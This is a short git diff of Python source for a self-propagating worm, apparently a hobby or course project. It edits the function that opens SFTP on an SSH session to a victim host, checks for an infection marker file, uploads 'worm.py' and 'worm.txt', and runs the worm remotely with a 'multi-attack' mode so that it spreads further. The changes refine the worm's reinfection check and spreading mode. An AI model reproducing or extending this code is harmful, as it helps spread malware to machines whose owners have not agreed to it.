@@ -40,16 +40,17 @@ def transfer_worm(ssh, LucyMode = False):
     
     try:
         ftp = ssh.open_sftp()
+        files = ftp.listdir_attr('.')
         
-        if not LucyMode:
-            for file in ftp.listdir_attr('.'):
-                if (file.filename == 'worm.txt'):
-                    print('Found Mark of the Worm')
-                    ftp.close()
-                    return -1
-        else:
+        if LucyMode:
             print("It's wormin' time")
-                
+            
+        for file in files:
+            if (file.filename == 'worm.txt' or file.filename == 'worm.py'):
+                print('Found Mark of the Worm')
+                ftp.close()
+                return 1 if LucyMode else -1
+            
         ftp.put('./worm.txt','./worm.txt')
         ftp.put('./worm.py', './worm.py')
         ftp.close()
@@ -62,7 +63,7 @@ def transfer_worm(ssh, LucyMode = False):
 def worm_victim(ssh, lucy = False):
     #start worm.py
     try:
-        cmd = 'python3 worm.py multi-attack Satan' if lucy else 'python3 worm.py'
+        cmd = 'python3 worm.py multi-attack Lucy' if lucy else 'python3 worm.py'
         ssh.exec_command(cmd)
         return True
     except Exception as error:
